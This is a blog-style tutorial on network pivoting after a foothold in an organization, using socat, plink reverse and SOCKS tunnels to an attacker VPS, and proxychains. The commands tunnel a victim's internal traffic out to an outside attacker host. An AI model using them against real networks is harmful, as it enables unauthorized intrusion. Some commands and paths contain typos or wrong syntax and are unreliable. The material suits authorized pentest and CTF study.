---
layout: single
title:  "Understanding SSH Tunnelling and Proxychains"
---

Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events. 

# Problem Statement
We have gained an initial foothold on one of the internal system of an organization. Now, we want to run `nmap` scans on the internal networks to pivot laterally. The organization is also running an internally hosted website which is not accessible from outside. How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?

# Cyber Range Setup
The setup of the cyber range is given in figure below:

![Deployment Architecture of Application](/musings/assets/images/2021-06-07-ssh-tunnel-fig-1.png){: .align-center }

# Actions at Victim Machine
## Step 1:
As we already have an initial foothold on the `victim` machine, we will start the `socate.exe`. This program will forward the traffic to its local port:
```
socate.exe TCP-LISTEN:8080,fork,reuseaddr TCP:<target-server-ip>:443
```
Once the traffic has been forwarded to a specific port, in our case `8080`, we can verify the same through `netstat` command:
```
# Now check if the port has been forwarded
netstat -ano // check connection
```
## Step 3:
We will redirect the traffic of the victim PC to the Virtual Private Server (VPS) through SSH tunnel, using `plink.exe` for windows.
```
# Connect with VPS
plink.exe -l <username> -pw <password> -R 8080:127.0.0.1:8080 <vps ip>
```

# Actions at VPS Machine
```
# To check with curl
/etc/hosts
127.0.0.1 <domain-name>
```
# Forward Traffic to Kali Machine from VPS
```
# On Kali Machine
ssh -g -L 8080:localhost:8080 -f -N <username>@<vps ip> // this use when want to open localhost
```
# Now open the browser and enter
```
http://<domain-name>:8080
```

# Configure SOCKS5 proxy
## Actions at victim machine
```
plink.exe -l <username> -pw <password> -D 8080:127.0.0.1:8080 <vps ip>
```
## Actions at VPS
### Install proxychains
```
$ yum install proxychains
$ nano /etc/proxychain.conf
socks5 <vps-public-ip> 8080
```
## Check on terminal
```
$ proxychains curl www.myweb.com
```
## On Kali Machine
### Do settings in the browser, if we want to open websites in browser

### In case you want to use terminal for traffic and not browser, perform following steps
```
$ yum install proxychains

# nano /etc/proxychain.conf
socks5 <vps-public-ip> 8080
```
## Check on terminal
```
$ proxychains curl www.myweb.com
```

#### Reference
- https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d